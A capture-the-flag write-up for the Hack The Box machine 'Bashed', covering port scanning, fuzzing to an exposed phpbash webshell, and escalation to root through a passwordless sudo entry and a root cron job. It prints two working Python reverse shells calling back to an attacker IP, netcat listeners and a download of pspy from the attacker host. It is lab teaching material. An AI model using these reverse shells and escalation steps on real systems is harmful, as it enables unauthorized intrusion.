---
title: "Bashed - Writeup"
linkTitle: "Bashed"
weight: 4
featured: true
platform: "HTB"
name: "Bashed"
os: "Linux"
difficulty: "Easy"
points: 20
release: "09 Dec 2017"
ip: "10.129.39.97"
# Drop a real avatar at static/img/htb/bashed.png and uncomment:
# avatar: "/img/htb/bashed.png"
tags: ["linux", "phpbash", "exposed-webshell", "sudo-nopasswd", "cron-abuse", "pspy", "root-shell"]
description: "Easy Linux box. The site's own blog post about a webshell tool it developed leads straight to that same tool, left exposed on the server, and a root cron job closes the loop."
---

{{< htb name="Bashed" os="Linux" difficulty="Easy" points="20" release="09 Dec 2017" ip="10.129.39.97" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.39.97
```

```
Open 10.129.39.97:80
```

```
(root㉿kali)# nmap 10.129.39.97 -p 80 -sCV -Pn
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
```

Just a web server, everything lives there.

## Enumeration

The homepage is a dev blog, and one post is unusually specific.

![Blog post about phpbash, mentioning it was developed on this exact server](/img/htb/bashed/01-phpbash-blog-post.png)

The site's own author says he built and tested `phpbash` on this exact machine. That's a direct hint, fuzz for it.

```
(root㉿kali)# ffuf -u "http://10.129.39.97/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -c -e php
```

```
css       [Status: 301]
dev       [Status: 301]
uploads   [Status: 301]
```

`/dev` is a directory listing, and the tool from the blog post is sitting right there.

![Directory listing of /dev showing phpbash.php and phpbash.min.php](/img/htb/bashed/02-dev-directory-listing.png)

## Initial Foothold

`phpbash.php` is a self-contained PHP webshell, browsing straight to it gives an interactive shell in the page itself.

![phpbash running in the browser as www-data on host bashed](/img/htb/bashed/03-phpbash-shell.png)

```
www-data@bashed:/var/www/html/dev# which python3
```

```
/usr/bin/python3
```

Upgrade to a real shell with a Python reverse shell.

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.249",4411));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```
(root㉿kali)# rlwrap nc -lnvp 4411
```

```
connect to [10.10.15.249] from (UNKNOWN) [10.129.39.97] 58234
$
```

```
cat /home/arrexel/user.txt
```

```
9c2bcbef9198a3f598af7eb6488bea07
```

## Privilege Escalation

```
sudo -l
```

```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

`www-data` can become `scriptmanager` with zero password, immediately.

```
sudo -u scriptmanager /bin/bash
```

```
scriptmanager@bashed:~$ cd /scripts
scriptmanager@bashed:/scripts$ ls -la
```

The `scripts` directory is owned by `scriptmanager`, and something is writing files into it. Confirm what's actually running it with `pspy`.

```
(root㉿kali)# python3 -m http.server 80
```

```
scriptmanager@bashed:/tmp$ wget http://10.10.15.249/pspy64 -O pspy64
scriptmanager@bashed:/tmp$ chmod +x pspy64
scriptmanager@bashed:/tmp$ ./pspy64
```

```
2026/07/19 12:49:01 CMD: UID=0  PID=1583  | python test.py
2026/07/19 12:49:01 CMD: UID=0  PID=1582  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
2026/07/19 12:49:01 CMD: UID=0  PID=1581  | /usr/sbin/CRON -f
```

A root cron job runs every `.py` file in `/scripts` once a minute. Drop a reverse shell into a new script.

```
scriptmanager@bashed:/scripts$ cat > test.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.249",4422))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
```

```
(root㉿kali)# rlwrap nc -lnvp 4422
```

```
connect to [10.10.15.249] from (UNKNOWN) [10.129.39.97] 46934
/bin/sh: 0: can't access tty; job control turned off
#
```

Wait for the next cron cycle, the shell lands as root once it fires.

```
# cd /root
# cat root.txt
```

```
3d103557eec3079cee03ff4fb159a1f0
```

![Terminal showing the root shell reading root.txt directly](/img/htb/bashed/04-root-shell-flag.png)

pspy's output confirms the exact mechanism afterward.

![pspy64 output showing the cron loop executing every .py file in /scripts as root](/img/htb/bashed/05-pspy-cron-confirmation.png)

## Lessons learned

- A blog post naming a tool and where it was tested is a direct enumeration hint, not just flavor text. The site's own content pointed straight at the exposed webshell.
- `sudo -l` with a `NOPASSWD: ALL` entry for a second account is effectively a free account switch, treat it as one and pivot immediately rather than looking for a more complex path.
- `pspy` doesn't just find hidden cron jobs, it confirms exactly how they're triggered. Seeing the literal shell loop (`for f in *.py; do python "$f"; done`) removes any guesswork about whether a dropped script will actually execute.
